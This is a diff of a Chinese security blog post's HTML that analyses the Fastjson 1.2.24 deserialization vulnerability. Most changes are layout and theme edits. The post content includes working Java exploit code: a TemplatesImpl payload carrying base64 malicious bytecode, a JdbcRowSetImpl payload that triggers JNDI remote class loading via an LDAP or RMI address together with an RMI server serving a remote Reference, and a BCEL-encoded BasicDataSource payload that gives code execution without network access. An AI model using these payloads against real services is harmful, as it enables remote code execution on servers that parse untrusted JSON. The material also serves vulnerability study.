@@ -3,14 +3,28 @@
 <head>
   <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="theme-color" content="#f7f7f4">
-<meta name="color-scheme" content="light">
+<meta name="color-scheme" content="light dark">
+<meta name="theme-color" content="#f7f7f4" data-theme-color-light="#f7f7f4" data-theme-color-dark="#161614">
 
 <title>FastJson1.2.24 — CurlySean&#39;s Blog</title>
 <meta name="description" content="这里是 CurlySean 的个人技术博客，记录漏洞研究、代码审计与攻防实践，整理可以复现、验证与继续推演的技术细节。">
-<link rel="canonical" href="http://curlysean.github.io/2025/03/24/Fastjson1-2-24/">
+<link rel="canonical" href="https://curlysean.github.io/2025/03/24/Fastjson1-2-24/">
+<link rel="preload" href="/fonts/instrument-sans-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/jetbrains-mono-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="stylesheet" href="/css/style.css">
-<script>document.documentElement.classList.add('js')</script>
+<script>
+  (function () {
+    try {
+      var key = 'sheepfold-theme';
+      var saved = localStorage.getItem(key);
+      var dark = saved === 'dark' || (saved !== 'light' && window.matchMedia('(prefers-color-scheme: dark)').matches);
+      document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+      document.documentElement.classList.add('js');
+    } catch (error) {
+      document.documentElement.classList.add('js');
+    }
+  })();
+</script>
 
 <meta name="generator" content="Hexo 7.3.0"></head>
 <body class="page-type-post">
@@ -37,11 +51,18 @@
         <a class="desktop-nav__link" href="/about/">关于</a>
       
     </nav>
-    <a class="header-cta" href="/archives/">开始阅读 <span aria-hidden="true">↗</span></a>
-    <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
-      <span class="sr-only">打开导航</span>
-      <span></span><span></span>
-    </button>
+    <div class="site-header__actions">
+      <button class="theme-toggle" type="button" data-theme-toggle aria-label="切换颜色模式" title="切换颜色模式">
+        <span data-theme-toggle-label>暗色</span>
+      </button>
+      
+        <a class="header-cta header-cta--ghost" href="/archives/">全部文章 <span aria-hidden="true">↗</span></a>
+      
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
+        <span class="sr-only">打开导航</span>
+        <span></span><span></span>
+      </button>
+    </div>
   </div>
   <nav class="mobile-nav" id="mobile-menu" aria-label="移动端主导航" data-mobile-menu>
     <div class="frame mobile-nav__inner">
@@ -90,12 +111,6 @@
         
       </div>
     </div>
-    <div class="frame post-meta-grid reveal">
-      <div><span>发布</span><time datetime="2025-03-24T04:29:32.000Z">2025.03.24</time></div>
-      <div><span>更新</span><time datetime="2025-03-24T04:29:32.000Z">2025.03.24</time></div>
-      <div><span>阅读</span><strong>30 MIN</strong></div>
-      <div><span>标签</span><strong>1</strong></div>
-    </div>
   </header>
 
   <div class="frame post-content-layout">
@@ -103,11 +118,17 @@
       <div class="post-rail__inner">
         <p class="eyebrow">ON THIS PAGE</p>
         
-          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vVnol"><span class="toc-text">Fastjson-1.2.24</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#W7xMF"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gQL0k"><span class="toc-text">出网情况下</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pKHDE"><span class="toc-text">基于TemplatesImpl的利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#zPmNk"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JawVE"><span class="toc-text">实现</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mlKqj"><span class="toc-text">基于JdbcRowSetImpl的利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ZjhDP"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dTrkQ"><span class="toc-text">实现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vQ7Z9"><span class="toc-text">不出网</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#i5BrD"><span class="toc-text">基于BasicDataSource的不出网利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Axayj"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EPEr4"><span class="toc-text">实现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#a1DQ0"><span class="toc-text">总结</span></a></li></ol></li></ol></nav>
+          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#W7xMF"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gQL0k"><span class="toc-text">出网情况下</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pKHDE"><span class="toc-text">基于TemplatesImpl的利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#zPmNk"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JawVE"><span class="toc-text">实现</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mlKqj"><span class="toc-text">基于JdbcRowSetImpl的利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ZjhDP"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dTrkQ"><span class="toc-text">实现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vQ7Z9"><span class="toc-text">不出网</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#i5BrD"><span class="toc-text">基于BasicDataSource的不出网利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Axayj"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EPEr4"><span class="toc-text">实现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#a1DQ0"><span class="toc-text">总结</span></a></li></ol></nav>
         
       </div>
     </aside>
     <div class="article-column">
+      <div class="post-meta-grid reveal">
+        <div><span>发布</span><time datetime="2025-03-24T04:29:32.000Z">2025.03.24</time></div>
+        <div><span>更新</span><time datetime="2025-03-24T04:29:32.000Z">2025.03.24</time></div>
+        <div><span>阅读</span><strong>约 11 分钟</strong></div>
+        <div><span>标签</span><strong>1</strong></div>
+      </div>
       <div class="article-body">
         <h1 id="vVnol">Fastjson-1.2.24</h1>
 <h2 id="W7xMF">环境</h2>
@@ -156,7 +177,7 @@
 
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastjsonTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] convert(String path) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path);</span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;File not found: &quot;</span> + path);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">            <span class="type">int</span> <span class="variable">readBytes</span> <span class="operator">=</span> fis.read(bytes);</span><br><span class="line">            <span class="keyword">if</span> (readBytes != file.length()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Failed to read the entire file: &quot;</span> + path);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">classPath</span> <span class="operator">=</span> <span class="string">&quot;F:\\temporary\\Test.class&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] code= convert(classPath);</span><br><span class="line">        <span class="type">String</span> <span class="variable">evilCode_base64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(code);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span></span><br><span class="line">                <span class="string">&quot;&#123;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="string">&quot;\&quot;,&quot;</span> + <span class="string">&quot;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evilCode_base64 + <span class="string">&quot;\&quot;],&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#x27;_name&#x27;:&#x27;asd&#x27;,&#x27;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_tfactory&#x27;:&#123; &#125;,\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_outputProperties\&quot;:&#123; &#125;&quot;</span> + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(payload, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741665111732-1dd04f0a-f731-4b88-b195-368974de28ae.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741665111732-1dd04f0a-f731-4b88-b195-368974de28ae.png" alt="FastJson1.2.24" loading="lazy"></p>
 <h3 id="mlKqj">基于JdbcRowSetImpl的利用链</h3>
 <h4 id="ZjhDP">分析</h4>
 
@@ -175,14 +196,14 @@
 <li>返回值为<code>DatabaseMetaData</code>，不为指定类型</li>
 <li>遍历getter方法需要使用<code>parseObject</code>方法，若要调用getter，则在<code>toJSON</code>方法前不能出错</li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737018884738-9b76e56b-4ec4-4e2f-a931-1cd6da406537.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737018884738-9b76e56b-4ec4-4e2f-a931-1cd6da406537.png" alt="FastJson1.2.24" loading="lazy"></p>
 <p>这里我们使用<code>setAutoCommit</code>方法，只要我们传入var1参数，这里我们可以调用<code>connect</code>方法，实现JNDI注入</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAutoCommit</span><span class="params">(<span class="type">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.conn = <span class="built_in">this</span>.connect();</span><br><span class="line">        <span class="built_in">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h4 id="dTrkQ">实现</h4>
 我用yakit的反连服务器工具来生成LDAP反连地址
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737020099338-09dc52aa-5f7b-4ccc-9cb4-fed45383e78a.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737020099338-09dc52aa-5f7b-4ccc-9cb4-fed45383e78a.png" alt="FastJson1.2.24" loading="lazy"></p>
 <p>它的实现十分简单，我们需要设置三个键值对</p>
 <ul>
 <li>@type : com.sun.rowset.JdbcRowSetImpl</li>
@@ -194,11 +215,11 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonJdbcRowSetImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:8085/ENbcWWGK\&quot;,\&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>这样即可使远程类加载</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737020566383-b0cfb972-0932-4411-a35c-f6ae4e255453.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737020566383-b0cfb972-0932-4411-a35c-f6ae4e255453.png" alt="FastJson1.2.24" loading="lazy"></p>
 <p>rmi也是同理，依旧可以造成注入</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// RMI</span></span><br><span class="line">        <span class="comment">//initialContext.rebind(&quot;rmi://localhost:1099/remoteObj&quot;, new RemoteObjImpl()); // JNDI 注入漏洞</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;TestRef&quot;</span>,<span class="string">&quot;TestRef&quot;</span>,<span class="string">&quot;http://localhost:7777/&quot;</span>);</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, reference);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737028187532-8f35b1ad-15a9-4796-be40-6ea5e1cdb7fb.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737028187532-8f35b1ad-15a9-4796-be40-6ea5e1cdb7fb.png" alt="FastJson1.2.24" loading="lazy"></p>
 <h2 id="vQ7Z9">不出网</h2>
 <h3 id="i5BrD">基于BasicDataSource的不出网利用链</h3>
 <h4 id="Axayj">分析</h4>
@@ -211,7 +232,7 @@
 <p>这里使用<code>encode</code>的原因是在BCEL的<code>ClassLoader</code>的<code>loadclass</code>中，有一个方法<code>createClass</code>，其中对传入的参数进行了一次<code>decode</code>，因此我们需要手动<code>encode</code>一次才不会出错</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> JavaClass <span class="title function_">createClass</span><span class="params">(String class_name)</span> &#123;</span><br><span class="line">    <span class="type">int</span>    <span class="variable">index</span>     <span class="operator">=</span> class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">real_name</span> <span class="operator">=</span> class_name.substring(index + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">byte</span>[]      bytes  = Utility.decode(real_name, <span class="literal">true</span>);</span><br><span class="line">      <span class="type">ClassParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassParser</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes), <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">      clazz = parser.parse();</span><br><span class="line">    &#125; </span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737023258681-e5d4eccc-abf0-4d06-a76f-94833c392181.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737023258681-e5d4eccc-abf0-4d06-a76f-94833c392181.png" alt="FastJson1.2.24" loading="lazy"></p>
 <p>接下来就要找到调用该类loadclass的地方，一直向上找最终找到getter或者是setter</p>
 <p>我们找到tomcat中的<code>BasicDataSource</code>类中的<code>createConnectionFactory</code></p>
 <p>若<code>driverClassLoader</code>不为空，则使用该类加载器对<code>driverClassName</code>进行加载</p>
@@ -225,14 +246,14 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> DataSource <span class="title function_">createDataSource</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        ......</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ConnectionFactory</span> <span class="variable">driverConnectionFactory</span> <span class="operator">=</span> createConnectionFactory();</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Connection <span class="title function_">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">return</span> createDataSource().getConnection();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
 <p>成功加载恶意类</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737024621886-c9f5661e-28a4-4733-9e85-bcb9c8e4c444.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737024621886-c9f5661e-28a4-4733-9e85-bcb9c8e4c444.png" alt="FastJson1.2.24" loading="lazy"></p>
 <h4 id="EPEr4">实现</h4>
 
 <p>将<code>@type</code>设为<code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</code>，对<code>driverClassName</code>和<code>driverClassLoader</code>进行赋值，其中Name要符合<code>$$BCEL$$</code>，而Loader要通过JSON来还原一个类加载器</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonBcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.sun.org.apache.bcel.internal.util.ClassLoader();</span><br><span class="line">        <span class="type">byte</span>[] bytes = convert(<span class="string">&quot;F:\\java\\RMI\\RMIServer\\target\\classes\\TestRef.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(bytes,<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">       <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot;</span>+code+<span class="string">&quot;\&quot;,\&quot;driverClassLoader\&quot;:\&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">       JSON.parse(s);</span><br><span class="line">       System.out.println(code);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] convert(String path) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path);</span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;File not found: &quot;</span> + path);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">            <span class="type">int</span> <span class="variable">readBytes</span> <span class="operator">=</span> fis.read(bytes);</span><br><span class="line">            <span class="keyword">if</span> (readBytes != file.length()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Failed to read the entire file: &quot;</span> + path);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>最后成功利用，执行弹窗</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737026441543-270f389a-c84c-4e73-9131-695ba2fa7fa3.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737026441543-270f389a-c84c-4e73-9131-695ba2fa7fa3.png" alt="FastJson1.2.24" loading="lazy"></p>
 <h2 id="a1DQ0">总结</h2>
 
 <p><font style="color:rgb(80, 80, 92);">总结一下漏洞发生在反序列化的点，也就是 </font><code>Obj.parse</code><font style="color:rgb(80, 80, 92);"> 和 </font><code>Obj.parseObject</code><font style="color:rgb(80, 80, 92);"> 这里。必须的是传参要带入 class 的参数</font></p>
@@ -253,13 +274,13 @@
   <nav class="frame post-navigation" aria-label="相邻文章">
     
       <a href="/2025/03/24/FastJson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/">
-        <span>← PREVIOUS</span>
+        <span>更新一篇</span>
         <strong>FastJson各版本绕过分析</strong>
       </a>
     
     
-      <a href="/2025/03/24/FastJson%E5%9F%BA%E7%A1%80/">
-        <span>NEXT →</span>
+      <a class="post-navigation__older" href="/2025/03/24/FastJson%E5%9F%BA%E7%A1%80/">
+        <span>更早一篇</span>
         <strong>FastJson基础</strong>
       </a>
     
@@ -273,9 +294,9 @@
       <a href="/">CURLYSEAN</a>
       <span>持续记录，保持验证。</span>
     </div>
-    <p class="site-footer__copyright">© 2026 CurlySean</p>
+    <p class="site-footer__copyright">© 2025–2026 CurlySean</p>
     <nav class="site-footer__links" aria-label="外部链接">
-      <a href="https://github.com/CurlySean" target="_blank" rel="noopener">GitHub ↗</a>
+      <a href="https://github.com/CurlySean" target="_blank" rel="noopener noreferrer">GitHub ↗</a>
       <a href="mailto:5345414e@gmail.com">Email ↗</a>
     </nav>
   </div>
